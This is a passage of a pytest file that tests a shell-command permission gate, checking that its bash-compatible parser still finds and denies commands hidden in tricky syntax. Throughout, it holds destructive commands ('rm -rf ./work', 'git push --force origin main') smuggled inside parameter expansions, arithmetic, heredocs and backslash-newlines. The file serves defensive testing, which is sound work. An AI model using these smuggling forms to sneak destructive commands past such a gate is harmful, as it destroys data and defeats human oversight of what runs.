    # bash and dash run nothing here; the reading before runs the command and is kept
    ("echo ${x:-${x}&rm -rf ./work}", "delete"),
    ("echo ${x:-${x} | git push --force origin main\n@}@@}", "force_push"),
    ("echo ${x:-$(( } ; rm -rf ./work ))}", "delete"),
])
def test_word_closed_past_its_first_brace_is_also_read_as_before(line, category):
    """A ${ } word that closes past its first } is also read as before, ended at that }: both readings are decided
    and the stricter holds."""
    assert len(readings(_c(line))) > 1
    assert _out(line, {"gates": {"categories": {category: "deny"}}}) == "deny"


@pytest.mark.parametrize("line, policy", [
    # read as before it is one opaque_exec part, which asks under an allow-everything rule; bash's reading adds a
    # push that outranks it, and the rule would allow that line
    ("echo $(( $'\\'' ) ; git push --force origin main ; echo ' ))' ) ; echo \\'",
     {"gates": {"rules": [{"match": {"command": ""}, "decision": "allow"}]}}),
    # read as before it is a `$".."` read line, which asks; bash's reading makes it opaque_exec, and a rule
    # allowing opaque_exec would allow that line
    ('echo $"x${ `$(${x%${x/)]& && git push --force origin main',
     {"gates": {"rules": [{"match": {"command": ".", "category": "opaque_exec"}, "decision": "allow"}]}}),
])
def test_a_line_read_two_ways_decides_no_lower_than_before(line, policy):
    assert len(readings(_c(line))) > 1
    assert _out(line, policy) != "allow"


@pytest.mark.parametrize("line", [
    "echo ${a:-${b}}", 'echo "${a:-${b}}"', 'echo "$(echo ${a:-${b}})"', 'echo ${a:-${b}}"x"', "x=${a:-${b}} ls",
    "echo ${x:-<(echo })} ; echo ok", "echo \"${x:-'}'}\"", "cat <<EOF\n${a:-${b}}\nrm -rf ./work\nEOF",
    "echo ${x:-<(echo hi)} ; echo ok", "echo ${x:-<(echo hi)}${y:-<(echo yo)}",
])
def test_both_readings_of_a_closed_word_add_no_false_ask(line):
    """The reading before keeps the rest of the line in its context (quotes, assignment, heredoc body)."""
    assert _out(line) == "allow"


def test_hidden_push_beside_a_visible_delete_decides_as_the_line_written_out():
    """The push a word hid now counts beside the delete, as on the same line written out, and deny: [delete] still
    denies both, since a deny matches any part of a line (D-075, #126)."""
    hidden = "echo ${X:-$(git push --force origin main)} && rm -rf ./work"
    shown = "git push --force origin main && rm -rf ./work"
    assert {"force_push", "delete"} <= _categories(hidden)
    assert _out(hidden, _DELETE_LIST) == _out(shown, _DELETE_LIST) == "deny"
    assert _out(hidden, _FORCE_LIST) == _out(shown, _FORCE_LIST) == "deny"


@pytest.mark.parametrize("line", [
    "echo ${x:-$(cat <<EOF)} ; echo hi\ngit push --force origin main\nEOF",
    "echo ${x:-<(cat<<EOF)'\nEOF\n'}\ngit push --force origin main",
    "echo $(cat <<EOF) ; echo hi\ngit push --force origin main\nEOF",
    "cat <(cat <<EOF) ; echo hi\ngit push --force origin main\nEOF",
])
def test_heredoc_left_open_in_a_substitution_does_not_take_the_following_lines(line):
    """A here-document opened in a $( ) or <( ) belongs to it, as in bash's parser; one left open at its `)` takes
    no line after it."""
    assert "force_push" in _categories(line)
    assert _out(line, _FORCE_DENY) == "deny"


@pytest.mark.parametrize("line", [
    "echo $(( ${x:-'))\ngit push --force origin main\n'} ))",
    "echo $(( ) #( )) ; git push --force origin main\n) ))",
    # a newline inside $( ) while the outer heredoc waits: bash starts the body after the outer line, the reading
    # before at that newline; both are read, and the push the reading before sees is denied
    "cat <<EOF $(echo x\n)\ngit push --force origin main\nEOF",
])
def test_line_read_two_ways_keeps_the_stricter_reading(line):
    assert "force_push" in _categories(line)
    assert _out(line, _FORCE_DENY) == "deny"


def test_outer_heredoc_body_starts_after_the_outer_newline():
    """A newline inside $( ) does not read the outer line's heredoc, as in bash."""
    line = "cat <<EOF $(echo x\n)\nbody\nEOF\ngit push --force origin main"
    assert _out(line, _FORCE_DENY) == "deny"
    cmds, _, _ = _parse(line)
    assert [h.body for k in cmds for h in k.heredocs] == ["body"]


def test_a_command_in_a_substitution_before_the_outer_heredoc_body_is_read():
    """bash runs the delete inside $( ) and reads the heredoc body after the line; the reading before took the
    delete for that body."""
    line = "cat <<EOF $(echo x\nrm -rf ./work\n)\nEOF"
    assert "delete" in _categories(line)
    assert _out(line, _DELETE_LIST) == "deny"


# --- words left open, backslash-newline, `$'` in double quotes, bash 5.3 ---------------------------------------

@pytest.mark.parametrize("line", [
    "echo $(( ${x:-<(})`echo ))`) ) ; git push --force origin main ; :",
    "echo ${x:-<(}) ; git push --force origin main ; :",
    "echo ${x:-<(})x ; git push --force origin main",
    "echo ${x:-'} ; git push --force origin main",
    "echo ${x:-\"\"\"} #\ngit push --force origin main",
    "echo ${x:-'}#; git push --force origin main",
    # inside double quotes the rest of the word is read inside them too, so the " after the } closes them
    'echo "${x:+(1"}" ; git push --force origin main # ',
])
def test_parameter_word_left_open_still_reads_what_follows_its_first_brace(line):
    """A ${ } word that never closes asks (bash rejects the line), and the line is also read as before, which ends
    the word at its first }, so the command after it is classified."""
    assert "force_push" in _categories(line)
    assert _out(line, _FORCE_DENY) == "deny"


def test_a_parameter_word_bash_never_closes_asks():
    """bash rejects the line (and dash too): the word is unread and the line asks."""
    line = "echo ${x:-$(( #*#))\ngit push --force origin main\\"
    assert "indirection" in _signals(line)
    assert _out(line, _FORCE_DENY) in ("ask", "deny")


@pytest.mark.parametrize("line", [
    'echo "$\\\n(git push --force origin main)"',
    "echo ${x:-$\\\n(git push --force origin main)}",
    "cat <<EOF\n$\\\n(git push --force origin main)\nEOF",
    'echo "${x:-$\\\n\\\n(git push --force origin main)}"',
])
def test_backslash_newline_after_a_dollar_is_dropped_as_bash_drops_it(line):
    """bash and dash drop a backslash-newline before they read what a $ starts, in double quotes, ${ } words and
    heredoc bodies too, so `$\\`, a newline and `(cmd)` run cmd."""
    assert "force_push" in _categories(line)
    assert _out(line, _FORCE_DENY) == "deny"


def test_backslash_newline_inside_single_quotes_stays_text():
    assert _out("echo '$\\\n(git push --force origin main)'") == "allow"


def test_a_dollar_quote_inside_double_quotes_is_no_ansi_c_string():
    """In double quotes bash reads `$'` as a $ and a quote, so the quote does not hide the command after."""
    line = 'echo "$\'" ; rm -rf ./work # \'"'
    assert "delete" in _categories(line)
    assert _out(line, _DELETE_LIST) == "deny"


@pytest.mark.parametrize("line", [
    "echo ${ git push --force origin main; }",
    "echo ${| git push --force origin main; }",
    "echo ${\ngit push --force origin main\n}",
    'echo "${ git push --force origin main; }"',
    "echo ${ echo }; git push --force origin main; }",
])
def test_bash_5_3_function_substitution_is_read_as_commands(line):
    """bash 5.3 runs ${ cmd; } and ${| cmd; } in the current shell (bash 5.2 reports a bad substitution), so the
    text to the first } is classified, and the line asks."""
    assert "force_push" in _categories(line)
    assert "indirection" in _signals(line)
    assert _out(line, _FORCE_DENY) == "deny"


# --- _nest_end ends a part as the lexer does, in both readings -------------------------------------------------

_PIECES = ["$(", "<(", ">(", "(", ")", ")", ")", "'", '"', "`", "\\", "\n", "#", " ", ";", "<<", "EOF", "'EOF'", "x",
           "$((", "((", "))", "${", "${x:-", "${!", "@P}", "}", "}", "$'", '$"', "$x", "EOF)", "\\'", "\\`", "$", "\t"]


@pytest.mark.parametrize("flat", [False, True], ids=["bash", "before"])
def test_the_nest_end_is_the_lexers_for_parameter_words(flat):
    """Past the cap a part ends where the lexer would end it, ${..} words and $(( included, in the reading of #143
    and in the one before (tests/security/test_gate_value_nest.py checks the rest of the syntax)."""
    rnd = random.Random(143)
    token = gate._flat_words.set(flat)
    try:
        for _ in range(4000):
            text = "".join(rnd.choice(_PIECES) for _ in range(rnd.randint(1, 50)))
            lx = gate._Lexer(text, scan=False, nest=-10**6)             # never cut
            lx.run(closer=True)
            assert gate._nest_end(text, 0, [])[0] == lx.i, text
    finally:
        gate._flat_words.reset(token)


# --- cost ------------------------------------------------------------------------------------------------------

_UNITS = [
    ("echo \"${x:-", "'$(( 1 )) ${y}'", "}\""),
    ("echo \"${x:-", "'${y:-'", "}\""),
    ("echo ", "$(( '(' + 1 )) ", ""),
    ("echo ", "$(( (1) ", ""),
    ("echo ", "$(cat <<EOF) ", ""),
    ("echo ", "$(( $'\\'' `(` ", ""),
    ("echo ", "${x:-<(})", ""),
    ("echo ", "$( ${x:-<(}) ", ""),
    ("echo ", "${x:-} ${y:-'", ""),
    ("echo ", "${x:-$(}", ""),
    ("echo ", "${x:-$((}", ""),
    ("echo ", '$((")', ""),
    ("echo ", "${x:-${y:-$(}", ""),
    ("echo ", "${a:-${b}}", ""),
    ("echo ", "\"${x:-'}'}\"", ""),
    ("echo ", "${x:-<(echo })}", ""),
    ("echo ", "\"${x:-'}\" ; echo \"'}\" ", ""),
    ("echo ", "${ ", ""),
    ("echo ", "${!x@P}", ""),
    ("echo ", "${@:", ""),
    ("echo ", '$(( "$(: "((" ; echo 1)" ', ""),
    ("echo ", "$(( $(: # (\n) ", ""),
    ("echo ", "$(( )#( )) ", ""),
    ("echo ", "$(( ${x:-)) ", ""),
    ("echo ", "$(( |#( ))' ", ""),
    ("echo ", '$(("))', ""),
    ("echo ", "${x:-<(}", ""),
    ("echo ", "$(( ${x:-", ""),
    ("echo ", "${x:-<(} )", ""),
    ("echo ", "$\\\n(", ""),
]


@pytest.mark.parametrize("before, unit, after", _UNITS)
def test_bounded_scans_stay_linear(before, unit, after):
    """One parse does work in proportion to the line (4 times the steps for 4 times the units; 16 if quadratic)."""
    def steps(n: int) -> int:
        return _steps(lambda: _parse(before + unit * n + after))
    assert steps(160) < 6 * steps(40)


@pytest.mark.parametrize("before, unit, after", _UNITS)
def test_nested_sources_are_parsed_a_bounded_number_of_times(before, unit, after):
    """A word or group left open holds the rest of the line, and each level the _NEST cap allows lists it again;
    classify reads each source once per depth (#334), so the count does not grow with the line."""
    assert _parses(before + unit * 60 + after, cap=600) == _parses(before + unit * 240 + after, cap=600)


def test_unclosed_arithmetic_chain_costs_what_a_command_substitution_chain_costs():
    """A $(( that never closes takes the rest of the text and asks (bash rejects the line), and its end is found once
    for the whole chain (_arith_end), so it costs no more than a chain of $( ) does."""
    def steps(unit: str) -> int:
        return _steps(lambda: _c("echo " + unit * 100))
    assert steps("$(( (1) ") < 4 * steps("$( (1) ")


_WORD_NESTS = [
    lambda k: "echo " + "$(( $(: ${x:-))}) ; " * k + "( : ) ))" * k,
    lambda k: "echo " + "$(${x:-" * k + "$(: )" + "})" * k,
    lambda k: "echo ${x:-" + "$(a " * k + "$(: )" + ")" * k + "}",
    lambda k: 'echo "' + '${x:-$(echo "' * k + "x" + '")}' * k + '"',
    lambda k: "echo \"${x:-'" + "$(echo \"${y:-'" * k + "x" + "'}\")" * k + "'}\"",
    lambda k: "echo " + "${x:-<(" * k + ": " + ")}" * k,
    lambda k: "echo " + "$((echo a) ; " * k + "(: ) )" * k,
    lambda k: "echo ${x:-$(( " + "$(a " * k + "1" + ")" * k + " ))}",
    lambda k: "echo ${x:-`" + "$(a " * k + ": " + ")" * k + "`}",
    lambda k: "echo ${x:-$(a `" + "$(a " * k + ": " + ")" * k + "`)}",
    lambda k: "echo ${ " + "$(a " * k + ": " + ")" * k + "; }",
]


@pytest.mark.parametrize("make", _WORD_NESTS, ids=["arith", "cmd-word", "word-nest", "dq", "span", "procsub", "group",
                                                   "word-arith", "word-backquote", "part-backquote", "funsub"])
def test_a_nest_only_bash_reads_costs_what_a_short_nest_costs(make):
    """The reading before reads no nest that a part only bash's reading opens holds; bash's reading reads
    _WORD_NEST + 1 levels of it and no deeper, so what it adds to the reading before costs at 32 levels what it
    costs at 8, with the text four times as long. (The reading before is main's, whose own cost grows with the text:
    #320 reads each $(( in a word to its end, counting its parentheses, six times the steps on the group form.)"""
    def added(k: int) -> int:
        return _steps(lambda: _c(make(k))) - _steps(lambda: _before(make(k)))
    assert _parses(make(32)) == _parses(make(8))
    assert added(32) < 3 * added(8)


def _before(line: str) -> gate.Classification:
    """The line read only as before #143."""
    token = gate._flat_words.set(True)
    try:
        return _c(line)
    finally:
        gate._flat_words.reset(token)


def test_a_wide_line_of_word_nests_costs_a_small_multiple_of_the_reading_before():
    """32 nests of `$(${x:-` 16 deep on one line (about 5,900 characters): each part is read 3 levels deep and the
    call opens _WORD_PARTS parts at most, so the line costs in proportion to its length, and both readings together
    under 3 times the reading before alone."""
    def wide(n: int) -> str:
        return "".join("echo " + "$(${x%d:-" % i * 16 + "$(: )" + "})" * 16 + " ; " for i in range(n))
    line = wide(32)
    assert len(line) > 5800
    assert _parses(line, cap=200) <= 4 * _parses(wide(8))
    both = _steps(lambda: _c(line))
    assert both < 5 * _steps(lambda: _c(wide(8)))
    assert both < 3 * _steps(lambda: _before(line))


# A line from a structured fuzz of words, $( ) and $(( with quotes, case patterns and here-docs (data; never run).
_FUZZ_LINE = "\n".join([
    'echo ${x:-${x:-${x:-$($(git push --force origin main){$(")))$(")"x}rm -rf ./work))}($((1))'
    '}$(',
    '$($(""} ; <(")$(:)$(git push --force origin main`${x:-\'`',
    '${x:-)})\'))${x:-$(")"case x in x) : ;; esac$( ; ${x:-\'}\'}`\\$x$\'\')',
    ')( ; ${x:-${x:-x\'(\'case x in x) : ;; esac\'(\'`\'(\'}$(\'(){)$({1(")1)}}$((((")"(${x:-',
    '}""${x:-(}\'(\'${x:-\'}\'}"\'(\'${x:-',
    '}"(")"${x:-\\{#$((1))))${x:-$(()<<E',
    ')))}"$(${x:-($(($x$(rm -rf ./work\\)"case x in x) : ;; esac`',
    'E',
    '")({${x:-\'}\'}<(case x in x) : ;; esac)$(${x:-(}case x in x) : ;; esac(`)git push --force o'
    'rigin main ; ${x:-$((${x:-$(:)#"}git push --force origin main))\'(\')){+}$((rm -rf ./work$($'
    '{x:-(}: (()) )${x:-$((;1${x:-\')\'}${x:-\'}\'})))})#$($($(($((1))${x:-(}${x:-)}rm -rf ./work)"'
    "$((`$')) )${x:-rm -rf ./work${x:-(}x}))${x:-$(($(${x:-)}git push --force origin main${x:-("
    '})))<(})"(($(((${x:-$((()${x:-: {\'}}) )',
    '${x:-((rm -rf ./work<<E',
    "${x:-)}})$(${x:-($((1))${x:-'}'}${x:-<<E",
    '#',
    '}$(($x$((1))$x$(:))))${x:-$x(})")"}<<E',
    '$($(($(x:  ; git push --force origin main)$(((',
    ')))))$((()$((${x:-',
    'E',
    '"\')\'")") )))$($(())(rm -rf ./work")"x))))$((case x in x) : ;; esac)$(( ; )))))( ; rm -rf .'
    '/work))$(${x:-$((1${x:-\'}\'}\'))git push --force origin main$(`git push --force origin main"'
    '\')\')git push --force origin main$((1))}${x:-$x)${x:-$($(${x:-)}${x:-(})$(: ;))})$((${x:-")'
    '"$(${x:-(rm -rf ./work$(:)$(git push --force origin main")"',
    '(()`)}$(${x:-{',
    'E',
    '}rm -rf ./work$(+#',
    'E',
    '));',
    ') ))',
])


def test_a_fuzzed_line_is_parsed_a_bounded_number_of_times():
    """Four copies of the line cost as many parses as one: a word or part that runs out lists no source for the
    rest of the text (it asks), so the parts left open do not stack up from copy to copy."""
    assert _parses(_FUZZ_LINE) == _parses("\n".join([_FUZZ_LINE] * 4))
